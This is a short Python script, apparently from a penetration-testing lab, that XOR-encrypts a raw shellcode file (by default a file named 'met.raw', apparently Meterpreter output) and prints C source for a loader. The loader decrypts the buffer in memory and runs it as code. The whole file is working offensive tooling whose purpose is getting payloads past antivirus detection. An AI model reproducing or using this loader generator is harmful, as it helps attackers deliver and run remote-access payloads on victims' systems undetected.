from common.shellcode_formator import to_c_array
from common.encrypt_utils import EncryptUtils, Algorithm, Language
import sys


template = """
int main (int argc, char **argv)
{
    unsigned char buf[] = %(encrypted_shellcode)s;
    int arraysize = (int) sizeof(buf);
    for (int i=0; i<arraysize-1; i++){
        buf[i] = (buf[i] ^ %(decryption_key)s);
    }
    int (*ret)() = (int(*)())buf;
    ret();
}
"""


def read_shellcode_file(shellcode_fp):
    with open(shellcode_fp, 'rb') as f:
        return f.read()


def get_code(shellcode_fp, key):
    shellcode = read_shellcode_file(shellcode_fp)
    enc_utils = EncryptUtils(Algorithm.XOR, key)
    encrypted_shellcode = enc_utils.encrypt(shellcode)
    code = template % {'decryption_key': str(key),'encrypted_shellcode': to_c_array(encrypted_shellcode)}
    print(code)


shellcode_path = "/home/parallels/lab/clientside_exec/tmp/met.raw"
key = 7
if len(sys.argv) > 1:
    shellcode_path = sys.argv[1]
    if len(sys.argv) > 2:
        key = int(sys.argv[2])
get_code(shellcode_path, key)
